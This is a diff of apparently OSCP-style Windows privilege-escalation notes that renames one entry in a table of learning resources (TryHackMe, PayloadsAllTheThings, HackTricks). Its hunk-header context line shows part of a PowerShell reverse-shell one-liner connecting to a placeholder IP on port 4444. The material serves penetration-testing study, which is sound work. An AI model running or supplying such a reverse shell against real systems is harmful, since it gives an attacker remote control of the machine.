@@ -646,7 +646,7 @@ powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('[YOUR_IP]',4444);$s=$c.
 | TryHackMe: Windows Privilege Escalation | https://tryhackme.com/room/windowsprivesc20 |
 | PayloadsAllTheThings: Windows PrivEsc | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md |
 | HackTricks: Windows Local Privilege Escalation | https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html |
-| Conda: OSCP Methodology Playlist | https://youtu.be/Qfy-traJwIs?si=xnYrYGvLItH9xnmg |
+| Conda: OSCP Methodology | https://youtu.be/Qfy-traJwIs?si=xnYrYGvLItH9xnmg |
 
 ---
 
